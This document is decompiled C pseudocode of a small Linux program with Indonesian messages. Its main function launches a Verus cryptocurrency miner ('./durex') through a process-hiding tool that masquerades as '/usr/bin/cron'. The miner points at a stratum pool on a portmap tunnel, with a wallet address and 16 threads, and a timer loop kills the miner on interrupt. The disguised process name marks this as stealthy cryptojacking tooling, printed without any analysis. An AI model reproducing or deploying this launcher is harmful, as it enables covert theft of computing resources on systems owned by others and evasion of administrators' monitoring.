#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

__int64 (**init_proc())(void);
void sub_1020();
void sub_1030();
void sub_1040();
void sub_1050();
void sub_1060();
void sub_1070();
void sub_1080();
void sub_1090();
void sub_10A0();
void sub_10B0();
void sub_10C0();
void sub_10D0();
void sub_10E0();
void sub_10F0();
void sub_1100();
void sub_1110();
void sub_1120();
void sub_1130();
// int __fastcall _cxa_finalize(void *);
// __int64 __isoc99_fscanf(_QWORD, const char *, ...); weak
// int puts(const char *s);
// int sigaction(int sig, const struct sigaction *act, struct sigaction *oact);
// int fclose(FILE *stream);
// int printf(const char *format, ...);
// double difftime(time_t time1, time_t time0);
// int sigemptyset(sigset_t *set);
// int kill(__pid_t pid, int sig);
// time_t time(time_t *timer);
// int fflush(FILE *stream);
// FILE *fopen(const char *filename, const char *modes);
// void perror(const char *s);
// void __noreturn exit(int status);
// int execlp(const char *file, const char *arg, ...);
// unsigned int sleep(unsigned int seconds);
// __pid_t fork(void);
void __fastcall __noreturn start(__int64 a1, __int64 a2, void (*a3)(void));
FILE **deregister_tm_clones();
__int64 register_tm_clones();
FILE **_do_global_dtors_aux();
__int64 frame_dummy();
void handle_signal();
unsigned __int64 __fastcall kill_process_from_pid_file(const char *a1);
int __fastcall main(int argc, const char **argv, const char **envp);
void _libc_csu_fini(void); // idb
void term_proc();
// int __fastcall _libc_start_main(int (__fastcall *main)(int, char **, char **), int argc, char **ubp_av, void (*init)(void), void (*fini)(void), void (*rtld_fini)(void), void *stack_end);
// int __fastcall __cxa_finalize(void *);
// __int64 _gmon_start__(void); weak

//-------------------------------------------------------------------------
// Data declarations

_UNKNOWN _libc_csu_init;
__int64 (__fastcall *_frame_dummy_init_array_entry)() = &frame_dummy; // weak
__int64 (__fastcall *_do_global_dtors_aux_fini_array_entry)() = &_do_global_dtors_aux; // weak
void *_dso_handle = &_dso_handle; // idb
FILE *_bss_start; // idb
char completed_8061; // weak
int stop; // weak


//----- (0000000000001000) ----------------------------------------------------
__int64 (**init_proc())(void)
{
  __int64 (**result)(void); // rax

  result = &_gmon_start__;
  if ( &_gmon_start__ )
    return (__int64 (**)(void))_gmon_start__();
  return result;
}
// 40C8: using guessed type __int64 _gmon_start__(void);

//----- (0000000000001020) ----------------------------------------------------
void sub_1020()
{
  JUMPOUT(0LL);
}
// 1026: control flows out of bounds to 0

//----- (0000000000001030) ----------------------------------------------------
void sub_1030()
{
  sub_1020();
}

//----- (0000000000001040) ----------------------------------------------------
void sub_1040()
{
  sub_1020();
}

//----- (0000000000001050) ----------------------------------------------------
void sub_1050()
{
  sub_1020();
}

//----- (0000000000001060) ----------------------------------------------------
void sub_1060()
{
  sub_1020();
}

//----- (0000000000001070) ----------------------------------------------------
void sub_1070()
{
  sub_1020();
}

//----- (0000000000001080) ----------------------------------------------------
void sub_1080()
{
  sub_1020();
}

//----- (0000000000001090) ----------------------------------------------------
void sub_1090()
{
  sub_1020();
}

//----- (00000000000010A0) ----------------------------------------------------
void sub_10A0()
{
  sub_1020();
}

//----- (00000000000010B0) ----------------------------------------------------
void sub_10B0()
{
  sub_1020();
}

//----- (00000000000010C0) ----------------------------------------------------
void sub_10C0()
{
  sub_1020();
}

//----- (00000000000010D0) ----------------------------------------------------
void sub_10D0()
{
  sub_1020();
}

//----- (00000000000010E0) ----------------------------------------------------
void sub_10E0()
{
  sub_1020();
}

//----- (00000000000010F0) ----------------------------------------------------
void sub_10F0()
{
  sub_1020();
}

//----- (0000000000001100) ----------------------------------------------------
void sub_1100()
{
  sub_1020();
}

//----- (0000000000001110) ----------------------------------------------------
void sub_1110()
{
  sub_1020();
}

//----- (0000000000001120) ----------------------------------------------------
void sub_1120()
{
  sub_1020();
}

//----- (0000000000001130) ----------------------------------------------------
void sub_1130()
{
  sub_1020();
}

//----- (0000000000001260) ----------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __fastcall __noreturn start(__int64 a1, __int64 a2, void (*a3)(void))
{
  __int64 v3; // rax
  int v4; // esi
  __int64 v5; // [rsp-8h] [rbp-8h] BYREF
  char *retaddr; // [rsp+0h] [rbp+0h] BYREF

  v4 = v5;
  v5 = v3;
  _libc_start_main(
    (int (__fastcall *)(int, char **, char **))main,
    v4,
    &retaddr,
    (void (*)(void))_libc_csu_init,
    _libc_csu_fini,
    a3,
    &v5);
  __halt();
}
// 126A: positive sp value 8 has been found
// 1271: variable 'v3' is possibly undefined

//----- (0000000000001290) ----------------------------------------------------
FILE **deregister_tm_clones()
{
  return &_bss_start;
}

//----- (00000000000012C0) ----------------------------------------------------
__int64 register_tm_clones()
{
  return 0LL;
}

//----- (0000000000001300) ----------------------------------------------------
FILE **_do_global_dtors_aux()
{
  FILE **result; // rax

  if ( !completed_8061 )
  {
    if ( &__cxa_finalize )
      _cxa_finalize(_dso_handle);
    result = deregister_tm_clones();
    completed_8061 = 1;
  }
  return result;
}
// 4018: using guessed type char completed_8061;

//----- (0000000000001340) ----------------------------------------------------
__int64 frame_dummy()
{
  return register_tm_clones();
}

//----- (0000000000001349) ----------------------------------------------------
void handle_signal()
{
  stop = 1;
}
// 401C: using guessed type int stop;

//----- (0000000000001361) ----------------------------------------------------
unsigned __int64 __fastcall kill_process_from_pid_file(const char *a1)
{
  __pid_t pid; // [rsp+1Ch] [rbp-14h] BYREF
  FILE *stream; // [rsp+20h] [rbp-10h]
  unsigned __int64 v4; // [rsp+28h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  stream = fopen(a1, "r");
  if ( stream )
  {
    if ( (unsigned int)__isoc99_fscanf(stream, "%d", &pid) == 1 )
    {
      fclose(stream);
      if ( kill(pid, 15) == -1 )
        perror("Tidak dapat mengirim sinyal ke proses");
      else
        printf("\nProses dengan PID %d telah dihentikan.\n", (unsigned int)pid);
    }
    else
    {
      perror("Tidak dapat membaca PID dari file");
      fclose(stream);
    }
  }
  else
  {
    perror("Tidak dapat membuka file PID");
  }
  return __readfsqword(0x28u) ^ v4;
}
// 1150: using guessed type __int64 __isoc99_fscanf(_QWORD, const char *, ...);

//----- (0000000000001441) ----------------------------------------------------
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int pid; // [rsp+8h] [rbp-C8h]
  unsigned int v5; // [rsp+10h] [rbp-C0h]
  time_t time0; // [rsp+18h] [rbp-B8h]
  time_t time1; // [rsp+20h] [rbp-B0h]
  double v8; // [rsp+28h] [rbp-A8h]
  struct sigaction act; // [rsp+30h] [rbp-A0h] BYREF
  unsigned __int64 v10; // [rsp+C8h] [rbp-8h]

  v10 = __readfsqword(0x28u);
  act.sa_handler = (__sighandler_t)handle_signal;
  act.sa_flags = 0;
  sigemptyset(&act.sa_mask);
  sigaction(2, &act, 0LL);
  sigaction(15, &act, 0LL);
  sigaction(3, &act, 0LL);
  pid = fork();
  if ( !pid )
  {
    execlp(
      "/usr/bin/hi",
      "hi",
      "-s",
      "/usr/bin/cron",
      "-d",
      "-p",
      "cron.pid",
      "./durex",
      "-a",
      "verus",
      "-o",
      "stratum+tcp://okeycn-26223.portmap.host:26223",
      "-u",
      "RSHQRzrfhXzgnwbpME1y6kX6HxNvyzQVZy.ewegitu1",
      "-p",
      "x",
      "-t",
      "16",
      0LL);
    perror("Gagal menjalankan perintah");
    exit(1);
  }
  if ( pid < 0 )
  {
    perror("Fork gagal");
    exit(1);
  }
  time0 = time(0LL);
  puts("Program berjalan. Tekan Ctrl+C untuk berhenti.");
  while ( !stop )
  {
    time1 = time(0LL);
    v8 = difftime(time1, time0);
    v5 = (int)((v8 - (double)(3600 * (int)(v8 / 3600.0))) / 60.0);
    printf(
      "\r%02d:%02d:%02d",
      (unsigned int)(int)(v8 / 3600.0),
      v5,
      (unsigned int)(int)(v8 - (double)(3600 * (int)(v8 / 3600.0)) - (double)(int)(60 * v5)));
    fflush(_bss_start);
    sleep(1u);
  }
  kill_process_from_pid_file("cron.pid");
  if ( kill(pid, 15) == -1 )
    perror("Tidak dapat mengirim sinyal ke proses anak");
  else
    printf("\nProses anak dengan PID %d telah dihentikan.\n", (unsigned int)pid);
  return 0;
}
// 401C: using guessed type int stop;

//----- (0000000000001750) ----------------------------------------------------
void __fastcall _libc_csu_init(unsigned int a1, __int64 a2, __int64 a3)
{
  signed __int64 v3; // rbp
  __int64 i; // rbx

  init_proc();
  v3 = &_do_global_dtors_aux_fini_array_entry - &_frame_dummy_init_array_entry;
  if ( v3 )
  {
    for ( i = 0LL; i != v3; ++i )
      (*(&_frame_dummy_init_array_entry + i))();
  }
}
// 3D38: using guessed type __int64 (__fastcall *_frame_dummy_init_array_entry)();
// 3D40: using guessed type __int64 (__fastcall *_do_global_dtors_aux_fini_array_entry)();

//----- (00000000000017C0) ----------------------------------------------------
void _libc_csu_fini(void)
{
  ;
}

//----- (00000000000017C8) ----------------------------------------------------
void term_proc()
{
  ;
}